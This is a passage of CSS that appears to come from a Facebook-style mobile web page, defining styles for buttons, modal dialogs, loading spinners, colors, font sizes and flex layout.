            cursor: pointer;
            overflow-x: hidden;
            position: relative
        }

        #modalDialog.spin {
            position: static
        }

        .mDialog .mFuturePageHeader .btn+.backButton {
            margin-left: 0
        }

        #mDialogHeader.firstStep .backButton,
        #modalDialog.spin #modalDialogView,
        #modalDialog #dialogSpinner {
            display: none
        }

        #modalDialog.spin #dialogSpinner {
            display: block
        }

        ._56br,
        .img._56br {
            display: inline-block;
            pointer-events: none;
            vertical-align: middle
        }

        a._2347,
        ._55sr {
            pointer-events: none
        }

        ._fea {
            cursor: pointer
        }

        .acw {
            background-color: #fff
        }

        .acbk {
            background-color: #000
        }

        .acb {
            background-color: #3b5998
        }

        .aclb {
            background-color: #eceff5
        }

        .acdb {
            background-color: #31394a
        }

        .acg {
            background-color: #f2f2f2
        }

        .acy {
            background-color: #fffbe2;
            color: #7f7212
        }

        .acr {
            background-color: #ffebe8;
            color: #6d220d
        }

        .touch .aps {
            padding: 2px 8px
        }

        .touch .apm {
            padding: 5px 8px
        }

        .touch .apl {
            padding: 8px
        }

        ._7k7 {
            list-style: none;
            margin: 0;
            padding: 0
        }

        ._2v9s {
            background: #dadde1
        }

        ._o28 {
            background: #ebe9e7
        }

        .ios.app._4f7a ._2v9s {
            background: #e9eaed
        }

        ._2sp {
            height: 12px;
            width: 12px
        }

        ._2sq {
            height: 20px;
            width: 20px
        }

        ._2so {
            display: inline-block
        }

        ._50cg._2ss {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: 0 -189px
        }

        ._50cg._2st {
            background-image: url(/rsrc.php/v3/y_/r/sO8pFbm5AdZ.png);
            background-repeat: no-repeat;
            background-size: auto;
            background-position: -84px -168px
        }

        ._50ch._2so {
            -webkit-mask-image: url(/rsrc.php/v3/yO/r/KG2Aq3EOvWn.png);
            -webkit-mask-size: 100% 100%;
            overflow: hidden
        }

        .x2 ._50ch._2so {
            -webkit-mask-image: url(/rsrc.php/v3/yI/r/kMZsERY12X9.png)
        }

        ._50ch ._2sr {
            height: 110%;
            left: -5%;
            -webkit-mask-image: url(/rsrc.php/v3/yd/r/C-DoQACmfug.png);
            -webkit-mask-position: center center;
            -webkit-mask-repeat: no-repeat;
            -webkit-mask-size: 100% 100%;
            position: relative;
            top: -5%;
            width: 110%
        }

        ._50ch._2ss ._2sr {
            background-color: rgba(0, 0, 0, .5)
        }

        ._50ch._2st ._2sr {
            background-color: rgba(255, 255, 255, .7)
        }

        ._2su {
            background-image: none;
            margin: 6px 8px;
            position: relative
        }

        .touch ._2su,
        .touch ._2su::after,
        .touch ._2su::before {
            border: 1px solid transparent;
            height: 5px;
            width: 2px
        }

        ._2su::after {
            content: "";
            position: absolute;
            right: -7px;
            top: -1px
        }

        ._2su::before {
            content: "";
            left: -7px;
            position: absolute;
            top: -1px
        }

        ._2su.frame2::before,
        ._2su.frame3,
        ._2su.frame4::after {
            height: 9px
        }

        ._2su.frame3::before,
        ._2su.frame4,
        ._2su.frame5::after {
            height: 7px
        }

        ._2su.frame2::before {
            top: -3px
        }

        ._2su.frame4::after,
        ._2su.frame5::after {
            top: -2px
        }

        ._2su.frame3::before,
        ._2su.frame4::before {
            top: 0
        }

        ._2su.frame3::after {
            top: 1px
        }

        ._2su.frame3 {
            margin: 4px 8px
        }

        ._2su.frame4 {
            margin: 5px 8px
        }

        ._2ss._2su,
        ._2ss._2su::after,
        ._2ss._2su::before {
            background: rgba(82, 111, 167, .06);
            border-color: rgba(82, 111, 167, .06)
        }

        ._2ss._2su.frame2::before,
        ._2ss._2su.frame3,
        ._2ss._2su.frame4::after {
            background: rgba(82, 111, 167, .66);
            border-color: rgba(82, 111, 167, 1)
        }

        ._2ss._2su.frame3::before,
        ._2ss._2su.frame4,
        ._2ss._2su.frame5::after {
            background: rgba(82, 111, 167, .4);
            border-color: rgba(82, 111, 167, .4)
        }

        ._2ss._2su.frame4::before,
        ._2ss._2su.frame5,
        ._2ss._2su.frame6::after {
            background: rgba(82, 111, 167, .13);
            border-color: rgba(82, 111, 167, .13)
        }

        ._2st._2su,
        ._2st._2su::after,
        ._2st._2su::before {
            background: rgba(216, 223, 234, .08);
            border-color: rgba(216, 223, 234, .07)
        }

        ._2st._2su.frame2::before,
        ._2st._2su.frame3,
        ._2st._2su.frame4::after {
            background: rgba(216, 223, 234, .66);
            border-color: rgba(216, 223, 234, .85)
        }

        ._2st._2su.frame3::before,
        ._2st._2su.frame4,
        ._2st._2su.frame5::after {
            background: rgba(216, 223, 234, .4);
            border-color: rgba(216, 223, 234, .34)
        }

        ._2st._2su.frame4::before,
        ._2st._2su.frame5,
        ._2st._2su.frame6::after {
            background: rgba(216, 223, 234, .13);
            border-color: rgba(216, 223, 234, .11)
        }

        ._55on {
            animation: mLoadingIndicatorRotation 1s infinite linear
        }

        .paused {
            animation-play-state: paused
        }

        @keyframes mLoadingIndicatorRotation {
            from {
                transform: rotate(0deg)
            }
            to {
                transform: rotate(360deg)
            }
        }

        ._52j9 {
            color: #90949c
        }

        ._52ja {
            color: #4b4f56
        }

        ._52jb {
            color: #1d2129
        }

        .touched ._592p ._52j9,
        .touched ._592p._52j9,
        .touched._592p ._52j9,
        .touched._592p._52j9,
        .touched ._592p ._52ja,
        .touched ._592p._52ja,
        .touched._592p ._52ja,
        .touched._592p._52ja,
        .touched ._592p._52jb,
        .touched._592p ._52jb,
        .touched ._592p ._52jb,
        .touched._592p._52jb,
        .touched ._592p,
        .touched._592p {
            color: #fff
        }

        ._56bq {
            font-size: 11px;
            line-height: 16px;
            text-transform: uppercase
        }

        ._52jc {
            font-size: 12px;
            line-height: 16px
        }

        ._52jd {
            font-size: 14px;
            line-height: 20px
        }

        ._52je {
            font-size: 16px;
            line-height: 20px
        }

        ._52jf {
            font-size: 18px;
            line-height: 24px
        }

        ._52jg {
            font-weight: 400
        }

        ._52jh {
            font-weight: 700
        }

        ._52ji {
            text-align: left
        }

        ._52jj {
            text-align: center
        }

        ._52jk {
            text-align: right
        }

        .touch ._8u8i ._52jf {
            font-size: 20px;
            line-height: 24px
        }

        .touch ._8usg ._84v9 {
            color: #1c1e21;
            font-size: 15px;
            line-height: 20px
        }

        .touch ._8ush ._84v9 {
            color: #606770;
            font-size: 15px;
            line-height: 20px
        }

        .img {
            border: 0;
            display: inline-block;
            vertical-align: top
        }

        i.img u {
            position: absolute;
            width: 0;
            height: 0;
            overflow: hidden
        }

        .btn {
            border: solid 2px;
            cursor: pointer;
            margin: 0;
            padding: 2px 6px 3px;
            text-align: center
        }

        .btn.largeBtn {
            display: block
        }

        button.largeBtn,
        input.largeBtn {
            width: 100%
        }

        .btnD,
        .acb .btnC,
        .btnI {
            background: #f3f4f5;
            border-color: #ccc #aaa #999;
            color: #505c77
        }

        .acb .btnD,
        .btnC,
        .acb .btnI {
            background: #3b5998;
            border-color: #8a9ac5 #29447e #1a356e;
            color: #fff
        }

        .btnS {
            background: #69a74e;
            border-color: #98c37d #3b6e22 #2c5115;
            color: #fff
        }

        .btnN {
            background: #ee3f10;
            border-color: #f48365 #8d290e #762610;
            color: #fff
        }

        .btn .img {
            pointer-events: none
        }

        .btn {
            display: inline-block
        }

        .btn+.btn {
            margin-left: 3px
        }

        .largeBtn+.largeBtn {
            margin-left: 0;
            margin-top: 6px
        }

        .btn input {
            background: none;
            border: none;
            margin: 0;
            padding: 0
        }

        .btnD input,
        .acb .btnC input,
        .btnI input {
            color: #505c77
        }

        .acb .btnD input,
        .btnC input,
        .acb .btnI input,
        .btnS input,
        .btnN input {
            color: #fff
        }

        .touch .btn {
            background-clip: padding-box;
            border: solid 1px;
            border-radius: 4px;
            box-sizing: border-box;
            display: inline-block;
            font-weight: 700;
            min-width: 50px;
            overflow: hidden;
            padding: 0 8px;
            text-overflow: ellipsis;
            vertical-align: bottom;
            white-space: nowrap
        }

        html .touch .btn {
            line-height: 27px
        }

        html .touch.ff button.btn {
            line-height: 25px
        }

        .touch .btn .img {
            margin-right: 4px
        }

        .touch .btn .img.touched_hide,
        .touch .btn .img.touched_show {
            display: inline-block
        }

        .touch .btn+.btn {
            margin-left: 5px
        }

        .x2.touch .btn,
        .touch .btnC.bgb {
            border: none;
            padding: 1px 9px
        }

        .touch .medBtn {
            padding: 3px 8px 2px
        }

        .x2.touch .medBtn,
        .touch .btnC.bgb.medBtn {
            padding: 4px 8px 3px
        }

        .touch .largeBtn {
            border-radius: 6px;
            display: block;
            padding: 7px 16px
        }

        .x2.touch .largeBtn,
        .touch .btnC.bgb.largeBtn {
            padding: 8px 17px
        }

        .touch .largeBtn+.largeBtn {
            margin-left: auto;
            margin-top: 12px
        }

        .touch .btn.iconOnly {
            min-width: 32px;
            padding-left: 0;
            padding-right: 0;
            text-overflow: clip
        }

        .touch .btn.iconOnly .img {
            margin-right: 0
        }

        .touch .btnD,
        .touch .btnI {
            background: #3b4456;
            background: linear-gradient(#fdfefe, #f0f1f2);
            box-shadow: inset 0 1px 0 #fff, 0 1px 0 rgba(0, 0, 0, .08)
        }

        .touch .btnD,
        .touch .btnC.bgb,
        .touch .btnI {
            border-color: #ccc #c0c1c2 #bdbec0
        }

        .touch .btn.btnD,
        .touch .btn.btnC.bgb,
        .touch .btn.btnI {
            color: #505c77;
            text-shadow: 0 1px 0 rgba(255, 255, 255, .6)
        }

        .x2.touch .btnD {
            box-shadow: inset 0 0 1px rgba(0, 0, 0, .7), inset 0 1px 0 #fff, 0 1px 2px -1px rgba(0, 0, 0, .25)
        }

        .touch .btnD.touched {
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .18), 0 1px 0 #fff
        }

        .touch .btnD.touched,
        .touch .btnI.touched {
            background: linear-gradient(#edeeee, #e4e5e6);
            border-color: #b0adae #bfbdbd #c7c8ca
        }

        .x2.touch .btnD.touched {
            box-shadow: inset 0 0 1px rgba(0, 0, 0, .4), inset 0 1px 2px rgba(0, 0, 0, .25), 0 1px 0 #fff
        }

        .touch .btnD.bgb {
            background: linear-gradient(#4663a2, #344f8e);
            border-color: #3a4a7b #2f406f #2b3a69;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .1), 0 1px 0 rgba(255, 255, 255, .08)
        }

        .touch .btn.btnD.bgb,
        .touch .btn.btnC,
        .touch .btn.btnI.bgb,
        .touch .btn.btnS,
        .touch .btn.btnN {
            color: #fff;
            text-shadow: 0 -1px 0 rgba(0, 0, 0, .35)
        }

        .x2.touch .btnD.bgb {
            box-shadow: inset 0 0 1px #000, inset 0 1px 0 rgba(255, 255, 255, .12), 0 1px 0 rgba(255, 255, 255, .08)
        }

        .touch .btnD.bgb.touched {
            background: linear-gradient(#31508e, #234180);
            border-color: #213564 #20366b #243771;
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .25), 0 1px 0 rgba(255, 255, 255, .1)
        }

        .x2.touch .btnD.bgb.touched {
            box-shadow: inset 0 0 1px rgba(0, 0, 0, .4), inset 0 1px 2px rgba(0, 0, 0, .25), 0 1px 0 rgba(255, 255, 255, .1)
        }

        .touch .btnI.bgdb {
            background: linear-gradient(#3b4456, #242a3a);
            border-color: #1b202a #1f2531 #1a1f2d;
            box-shadow: inset 0 1px 0 rgba(0, 0, 0, .1), 0 1px 1px rgba(255, 255, 255, .17);
            color: #bdc4d3;
            text-shadow: 0 -1px 0 rgba(0, 0, 0, .35)
        }

        .touch .btnI.bgdb.touched {
            background: linear-gradient(#2d3544, #1a1f2c);
            border-color: #141720 #171c25 #101620;
            box-shadow: inset 0 1px 0 rgba(0, 0, 0, .1), 0 1px 1px rgba(255, 255, 255, .17);
            color: #bec5d4;
            text-shadow: 0 -1px 0 rgba(0, 0, 0, .35)
        }

        .x2.touch .btnI.bgdb {
            box-shadow: inset 0 2px 1px -1px rgba(0, 0, 0, .45), inset 0 0 1px rgba(0, 0, 0, 1.0), 0 0 1px rgba(255, 255, 255, .1), 0 1px 0 rgba(255, 255, 255, .07)
        }

        .x2.touch .btnI.bgdb.touched {
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .7), inset 0 0 1px rgba(0, 0, 0, .5), 0 0 1px rgba(255, 255, 255, .1), 0 1px 0 rgba(255, 255, 255, .07)
        }

        .touch .btnD.bglb {
            border-color: #cacaca #b8babf #b1b4ba
        }

        .touch .btnD.bglb,
        .touch .btnI.bglb {
            background: linear-gradient(#fafbfe, #e0e3ea)
        }

        .touch .btnD.bglb.touched {
            border-color: #a6a7ab #abaeb3 #aeb0b5
        }

        .touch .btnD.bglb.touched,
        .touch .btnI.bglb.touched {
            background: linear-gradient(#e9ebf0, #cbced4)
        }

        .touch .btnC {
            border-color: #576499 #3a4b73 #263855;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .17), 0 1px 0 rgba(0, 11, 42, .12)
        }

        .touch .btnC,
        .touch .btnI.bgb {
            background: linear-gradient(#647aab, #2c467e)
        }

        .x2.touch .btnC,
        .x2.touch .btnS,
        .x2.touch .btnN {
            box-shadow: inset 0 0 1px rgba(0, 0, 0, .7), inset 0 1px 0 rgba(255, 255, 255, .3), 0 1px 2px -1px rgba(0, 0, 0, .7)
        }

        .touch .btnC.touched {
            border-color: #2f3c5e #24345d #1d305d
        }

        .touch .btnC.touched,
        .touch .btnS.touched,
        .touch .btnN.touched {
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .3), 0 1px 0 #fff
        }

        .touch .btnC.touched,
        .touch .btnI.bgb.touched {
            background: linear-gradient(#495f8e, #1f355e)
        }

        .x2.touch .btnC.touched,
        .x2.touch .btnS.touched,
        .x2.touch .btnN.touched {
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .45), 0 1px 0 #fff
        }

        .touch .btnC.bgb {
            background: linear-gradient(#fafbfe, #cfd2d9);
            box-shadow: 0 0 1px rgba(0, 0, 0, .4), 0 1px 2px rgba(0, 0, 0, .4)
        }

        .touch .btnC.bgb.touched {
            background: linear-gradient(#dfe1e8, #b9bcc4);
            box-shadow: 0 0 1px rgba(0, 0, 0, .9), inset 0 1px 2px rgba(0, 0, 0, .35), 0 1px 0 rgba(255, 255, 255, .17)
        }

        .x2.touch .btnI {
            box-shadow: inset 0 1px 1px rgba(43, 48, 60, .39), inset 0 0 1px rgba(43, 48, 60, 1.0), 0 1px 0 #fff
        }

        .x2.touch .btnI.touched {
            box-shadow: inset 0 1px 2px rgba(43, 48, 60, .7), inset 0 0 3px rgba(43, 48, 60, .4), 0 1px 0 #fff
        }

        .touch .btnI.bgb {
            border-color: #2a3349 #2a3a64 #253662;
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, .21), 0 1px 0 rgba(255, 255, 255, .17)
        }

        .touch .btnI.bgb.touched {
            border-color: #1b2438 #1a2745 #18294d;
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .6), 0 1px 0 rgba(255, 255, 255, .17)
        }

        .x2.touch .btnI.bgb {
            box-shadow: inset 0 2px 1px -1px rgba(0, 0, 0, .45), inset 0 0 1px rgba(0, 0, 0, 1.0), 0 1px 0 rgba(255, 255, 255, .17)
        }

        .x2.touch .btnI.bgb.touched {
            box-shadow: inset 0 1px 2px rgba(0, 0, 0, .7), inset 0 0 1px rgba(0, 0, 0, .5), 0 1px 0 rgba(255, 255, 255, .17)
        }

        .touch .btnI {
            border-color: #9599a1 #a8abb4 #acb1bb;
            box-shadow: inset 0 1px 1px rgba(43, 48, 60, .18), 0 1px 0 #fff
        }

        .touch .btnI.touched {
            border-color: #767a84 #92969f #a8abb4;
            box-shadow: inset 0 1px 2px rgba(43, 48, 60, .58), 0 1px 0 #fff
        }

        .touch .btnS {
            background: linear-gradient(#75ab4b, #4a8532);
            border-color: #68954c #427329 #386a24
        }

        .touch .btnS,
        .touch .btnN {
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, .22), 0 1px 0 rgba(0, 0, 0, .08)
        }

        .touch .btnS.touched {
            background: linear-gradient(#4f8425, #225f0b);
            border-color: #496f2d #46782b #45802c
        }

        .touch .btnN {
            background: linear-gradient(#df4451, #b91d2e);
            border-color: #b3373e #9e232c #941723
        }

        .touch .btnN.touched {
            background: linear-gradient(#b00930, #8b000f);
            border-color: #912c33 #ad2d37 #b41d2b
        }

        .touch .btn[disabled] .img,
        .touch .btn[disabled].touched .img {
            opacity: .5
        }

        .touch .btnD[disabled],
        .touch .btnC.bgb[disabled],
        .touch .btnI[disabled] {
            opacity: 1;
            color: #a7abb5;
            text-shadow: none
        }

        .touch .btnD.bgb[disabled],
        .touch .btnC[disabled],
        .touch .btnI.bgb[disabled] {
            opacity: 1;
            color: #9dabce;
            text-shadow: none
        }

        .touch .btnS[disabled] {
            opacity: 1;
            color: #aecd9c;
            text-shadow: none
        }

        .touch .btnN[disabled] {
            opacity: 1;
            color: #e4969c;
            text-shadow: none
        }

        .accelerate {
            -webkit-backface-visibility: hidden;
            position: relative;
            z-index: 2147483647
        }

        .ios .accelerate {
            perspective: 1px
        }

        .ios .accelerate .accelerate {
            perspective: none
        }

        .accelerate .accelerate,
        .decelerateChildren .accelerate {
            -webkit-backface-visibility: visible;
            z-index: auto
        }

        .touch .groupChromeView,
        #mEventSchedulableWall,
        #m_profile_stream,
        #m_newsfeed_stream,
        #root {
            position: relative;
            z-index: 0
        }

        .touch.no_acceleration * {
            -webkit-backface-visibility: visible !important
        }

        ._1-yc {
            border-radius: 50%
        }

        .profpic {
            background: #eceff5
        }

        .touch a.darkTouch,
        .touch .darkTouch a {
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
        }

        .touch .darkTouch.touched,
        .touch .darkTouch .touched,
        .touch .touched .darkTouch {
            position: relative
        }

        .touch .darkTouch.touched:after,
        .touch .darkTouch .touched:after,
        .touch .touched .darkTouch:after {
            background-color: #000;
            bottom: 0;
            content: '';
            height: auto;
            left: 0;
            opacity: .4;
            position: absolute;
            right: 0;
            top: 0
        }

        .touch a {
            color: #576b95;
            cursor: pointer;
            text-decoration: none
        }

        .touch.app a,
        .touch a[href=""],
        .touch a[href="#"] {
            -webkit-touch-callout: none
        }

        .touch a.sub {
            color: gray
        }

        .touch a.sec {
            color: #8190b0
        }

        .touch a.inv {
            color: #fff;
            -webkit-tap-highlight-color: rgba(255, 255, 255, .5)
        }

        .touchable {
            cursor: pointer
        }

        a.touchable {
            color: inherit;
            -webkit-tap-highlight-color: rgba(255, 255, 255, 0)
        }

        .no-outline {
            outline: none
        }

        .touch .popover_hidden {
            display: none
        }

        .disableClicks #root,
        .disableClicks #root * {
            pointer-events: none !important
        }

        .disableClicks #root .popover_flyout,
        .disableClicks #root .popover_flyout * {
            pointer-events: auto !important
        }

        .android.disableClicks a {
            -webkit-tap-highlight-color: rgba(0, 0, 0, 0)
        }

        .touch ._7om2 {
            display: flex;
            display: -webkit-flex
        }

        .touch ._4g33,
        .touch ._5i2i {
            display: flex
        }

        .touch ._52wc {
            align-items: flex-start
        }

        .touch ._52wd {
            align-items: flex-end
        }

        .touch ._52we {
            align-items: center
        }

        .touch ._52wf {
            align-items: stretch
        }

        .touch ._4g34 {
            -webkit-flex: 1;
            flex: 1;
            min-width: 0;
            width: 0
        }

        .touch ._5s61 ._4g34 {
            width: auto
        }

        .touch ._4g34 ._5xu4 {
            flex: 1;
            width: 100%
        }

        .ios.touch ._5xu4,
        .bb10.touch ._5xu4,
        .android.touch ._5xu4 {
            border: 1px solid transparent;
            margin: -1px
        }

        .ff.touch ._4g33 {
            box-sizing: border-box;
            height: 100%;
            width: 100%
        }

        .ff.touch ._4g34 {
            min-width: 1px
        }

        .ff.touch ._4g34>._5xu4>._5909>._4g33>._4g34,
        .ff.touch ._4g34>._5909>._4g33>._4g34 {
            width: 100%
        }

        .word_break {
            display: inline-block
        }

        .fcb {
            color: #000
        }

        .fcg {
            color: gray
        }

        .fcw {
            color: #fff
        }

        .fcl {
            color: #3b5998
        }

        .fcs {
            color: #6d84b4
        }

        .mfsxs {
            font-size: x-small
        }

        .mfss {
            font-size: small
        }

        body,
        tr,
        input,
        textarea,
        .mfsm {
            font-size: medium
        }

        .mfsl {
            font-size: large
        }

        .touch .mfsxs {
            font-size: 10px;
            line-height: 12px
        }

        .touch .mfss {
            font-size: 12px;
            line-height: 15px
        }

        .touch,
        .touch tr,
        .touch input,
        .touch textarea,
        .touch .mfsm {
            font-size: 14px;
            line-height: 18px
        }

        .touch .mfsl {
            font-size: 16px;
            line-height: 20px
        }

        ._59e9 {
            background: #f5f6f7
        }

        ._55wm {
            background: #dddfe2
        }

        ._67iw ._55wm {
            background: #ebe9e7
        }

        ._5s6y {
            background: #000
        }

        ._55wn {
            background: #3578e5
        }

        ._55wo {
            background: #fff
        }

        ._5oxw {
            background: #e9ebee
        }

        ._50zt {
            background: #e9eaed
        }

        ._25sz {
            background: #ff7f50
        }

        ._55x2>*,
        ._55x2._55x2>* {
            border-bottom: 1px solid #e5e5e5
        }

        ._55x2>:last-child {
            border-bottom: none
        }

        ._55x2+._55x2 {
            border-top: 1px solid #e5e5e5
        }

        ._55x2>*,
        ._55x2._55x2>* {
            border-bottom-color: rgba(0, 0, 0, .101)
        }

        .touch ._55wp {
            padding: 0
        }

        .touch ._55wq {
            padding: 4px
        }

        .touch ._55wr {
            padding: 8px
        }

        .touch ._55ws {
            padding: 12px
        }

        .touch ._56hq {
            padding: 16px
        }

        ._56bs {
            -webkit-appearance: none;
            background: none;
            display: inline-block;
            font-size: 12px;
            height: 28px;
            line-height: 28px;
            margin: 0;
            overflow: visible;
            padding: 0 9px;
            text-align: center;
            vertical-align: top;
            white-space: nowrap
        }

        .touch ._56bs {
            border: none;
            border-radius: 3px;
            box-sizing: border-box;
            position: relative;
            -webkit-user-select: none;
            z-index: 0
        }

        .touch ._1yoh ._56bs {
            border-radius: 0
        }

        .touch ._56bs::after,
        .touch.wp.x1-5 ._56bs::after,
        .touch.wp.x2 ._56bs::after {
            border-radius: 4px;
            border-style: solid;
            border-width: 1px;
            bottom: -1px;
            box-shadow: 0 1px 0 rgba(0, 0, 0, .07), inset 0 -1px 1px 0 rgba(0, 0, 0, .03);
            content: "";
            left: -1px;
            pointer-events: none;
            position: absolute;
            right: -1px;
            top: -1px;
            z-index: 1
        }

        .touch ._1yoh ._56bs::after,
        .touch ._1yoh ._56bs::after,
        .touch ._1yoh ._56bs::after,
        .touch.x1-5 ._1yoh ._56bs::after,
        .touch.x2 ._1yoh ._56bs::after {
            border-radius: 0;
            border-style: solid;
            border-width: 1px;
            bottom: -1px;
            box-shadow: 0 1px 0 rgba(0, 0, 0, .07), inset 0 -1px 1px 0 rgba(0, 0, 0, .03);
            content: "";
            left: -1px;
            pointer-events: none;
            position: absolute;
            right: -1px;
            top: -1px;
            z-index: 1
        }

        .touch ._56bs::before,
        .touch.wp.x1-5 ._56bs::before,
        .touch.wp.x2 ._56bs::before {
            border-radius: 19px;
            bottom: -1px;
            content: "";
            left: -1px;
            pointer-events: none;
            position: absolute;
            right: -1px;
            top: -1px;
            transform: none;
            z-index: -1
        }

        .touch.wp.x1-5 ._56bs::before,
        .touch.x2 ._56bs::before {
            left: 0;
            top: 0;
            transform: translate(-0.5px, -0.5px)
        }

        .touch ._56bt::before,
        .touch.wp.x1-5 ._56bt::before,
        .touch.wp.x2 ._56bt::before {
            content: none;
            display: none
        }

        ._56bt,
        ._56bt ._58gn,
        a._56bt {
            background-color: #f5f6f7;
            color: #4b4f56
        }

        .touch ._56bt {
            background-image: linear-gradient(rgba(255, 255, 255, .9), rgba(255, 255, 255, 0));
            text-shadow: 0 1px 1px rgba(255, 255, 255, .75)
        }

        .touch ._56bt::after,
        .touch.wp.x1-5 ._56bt::after,
        .touch.wp.x2 ._56bt::after {
            border-color: rgba(0, 0, 0, .10) rgba(0, 0, 0, .155) rgba(0, 0, 0, .29)
        }

        .touch ._56bt.touched {
            background-color: #e4e5e8;
            background-image: linear-gradient(rgba(255, 255, 255, .7), rgba(255, 255, 255, 0))
        }

        ._56bs._2347 ._56br,
        ._56bs[disabled] ._56br {
            opacity: .3
        }

        ._56bt._2347,
        a._56bt._2347,
        ._56bt[disabled] {
            color: #bec3c9
        }

        .touch ._26vk._56bt {
            background-color: #fff;
            background-image: none;
            border: 1px solid #8d949e;
            border-radius: 2px;
            color: #4b4f56;
            text-shadow: none
        }

        .touch ._8oa4 ._26vk._56bt {
            background-color: #f0f2f5;
            background-image: none;
            border: 1px solid #8d949e;
            border-radius: 2px;
            color: #444950;
            text-shadow: none
        }

        .touch ._26vk._56bt[disabled] {
            border-color: #bec3c9;
            color: #bec3c9
        }

        ._56bu,
        ._56bv,
        a._56bu,
        a._56bv,
        .touch a._56bu,
        .touch a._56bv,
        a.touchable._56bu,
        a.touchable._56bv {
            color: #fff
        }

        .touch ._56bu,
        .touch ._56bv,
        .touch a._56bu,
        .touch a._56bv {
            text-shadow: 0 -1px rgba(0, 0, 0, .25)
        }

        .touch ._26vk._56bu,
        .touch ._26vk._56bv,
        .touch a._26vk._56bu,
        .touch a._26vk._56bv {
            text-shadow: none
        }

        .touch ._56bu::after,
        .touch ._56bv::after,
        .touch.wp.x1-5 ._56bu::after,
        .touch.wp.x1-5 ._56bv::after,
        .touch.wp.x2 ._56bu::after,
        .touch.wp.x2 ._56bv::after {
            border-color: rgba(0, 0, 0, .15) rgba(0, 0, 0, .15) rgba(0, 0, 0, .26);
            box-shadow: 0 1px 0 rgba(0, 0, 0, .14), inset 0 -1px 1px 0 rgba(0, 0, 0, .03)
        }

        .touch ._56bu::before,
        .touch.wp.x1-5 ._56bu::before,
        .touch.wp.x2 ._56bu::before {
            background-color: #1877f2;
            background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1))
        }

        .touch ._56bv::before,
        .touch.wp.x1-5 ._56bv::before,
        .touch.wp.x2 ._56bv::before {
            background-color: #5b93fc;
            background-image: linear-gradient(rgba(0, 0, 0, 0), rgba(0, 0, 0, .1))
        }

        .touch ._56bu.touched::before,
        .touch.wp.x1-5 ._56bu.touched::before,
        .touch.wp.x2 ._56bu.touched::before {
            background-color: #536a9f
        }

        .touch ._56bv.touched::before,
        .touch.wp.x1-5 ._56bv.touched::before,
        .touch.wp.x2 ._56bv.touched::before {
            background-color: #4c83fb
        }

        ._56bu._2347,
        a._56bu._2347,
        ._56bu[disabled] {
            color: #899bc1
        }

        ._56bv._2347,
        a._56bv._2347,
        ._56bv[disabled] {
            color: #91b4fd
        }

        .touch ._26vk._56bu[disabled],
        .touch ._26vk._56bv[disabled] {
            background: #ebedf0;
            color: #bec3c9
        }

        ._56bw {
            font-size: 14px;
            height: 36px;
            line-height: 36px;
            padding: 0 16px
        }

        ._56bx {
            font-size: 14px;
            height: 44px;
            line-height: 44px;
            padding: 0 20px
        }

        .touch.x1-5 ._56bs::after,
        .touch.x2 ._56bs::after {
            border-color: transparent;
            border-radius: 0;
            border-width: 7px;
            bottom: -3px;
            box-shadow: none;
            left: -3px;
            right: -3px;
            top: -3px
        }

        .touch.x1-5 ._56bs::after,
        .touch.x2 ._56bs::after {
            border-color: initial;
            border-image: url(/rsrc.php/v3/yJ/r/2SxCuf1dsFy.png) 14 14 14 14 repeat
        }

        .touch.x1-5 ._56bv::after,
        .touch.x2 ._56bv::after,
        .touch.x1-5 ._56bu::after,
        .touch.x2 ._56bu::after {
            border-color: initial;
            border-image: url('') 14 14 14 14 repeat
        }

        .touch ._26vk {
            text-shadow: none
        }

        .touch ._26vk._56bu,
        .touch.wp.x1-5 ._26vk._56bu,
        .touch.wp.x2 ._26vk._56bu,
        .touch ._26vk._56bv,
        .touch.wp.x1-5 ._26vk._56bv,
        .touch.wp.x2 ._26vk._56bv {
            background-color: #4080ff;
            background-image: none;
            border-radius: 2px
        }

        .touch ._26vk::before,
        .touch ._26vk::after {
            content: none;
            display: none
        }

        ._56bs._26vk ._55sr {
            line-height: 28px;
            margin-top: 0
        }

        ._26vk._56bt ._55sr {
            position: relative;
            top: -1px
        }

        ._56bs ._55sr {
            display: inline-block
        }

        html ._56bs ._56br {
            vertical-align: top
        }

        ._56bs._56bs._56by ._56br {
            margin-top: 0
        }

        ._56bs ._55sr {
            line-height: 20px;
            margin-top: 4px
        }

        ._56bs ._56br._4q9a {
            margin-top: 8px
        }

        ._56bs ._56br._5msp {
            margin-top: 5px
        }

        ._56bs ._56br._4q9b {
            margin-top: 4px
        }

        ._56bs._56by {
            height: auto;
            line-height: 1;
            padding: 6px
        }

        ._56bs._56by._26vk {
            padding: 5px
        }

        ._56bs._56bz {
            padding-left: 8px
        }

        ._56bs._56b- {
            padding-right: 8px
        }

        ._56bs._56bz ._56br {
            margin-right: 6px
        }

        ._56bs._56b- ._56br {
            margin-left: 6px
        }

        ._56bw ._55sr {
            line-height: 24px;
            margin-top: 1px
        }

        ._56bw._26vk ._55sr {
            margin-top: 4px
        }

        ._56bw ._56br._4q9a {
            margin-top: 12px
        }

        ._56bw ._56br._5msp {
            margin-top: 10px
        }

        ._56bw ._56br._4q9b {
            margin-top: 8px
        }

        ._56bw._56by {
            padding: 8px
        }

        ._56bw._56bz {
            padding-left: 16px
        }

        ._56bw._56b- {
            padding-right: 16px
        }

        ._56bw._56bz ._56br {
            margin-right: 9px
        }

        ._56bw._56b- ._56br {
            margin-left: 9px
        }

        ._56bx ._55sr {
            line-height: 24px;
            margin-top: 10px
        }

        ._56bx ._56br._4q9a {
            margin-top: 16px
        }

        ._56bx ._56br._5msp {
            margin-top: 14px
        }

        ._56bx ._56br._4q9b {
            margin-top: 12px
        }

        ._56bx._56by {
            padding: 12px
        }

        ._56bx._56bz {
            padding-left: 24px;
            padding-right: 24px
        }

        ._56bx._56b- {
            padding-left: 24px;
            padding-right: 24px
        }

        ._56bx._56bz ._56br {
            margin-right: 10px
        }

        ._56bx._56b- ._56br {
            margin-left: 10px
        }

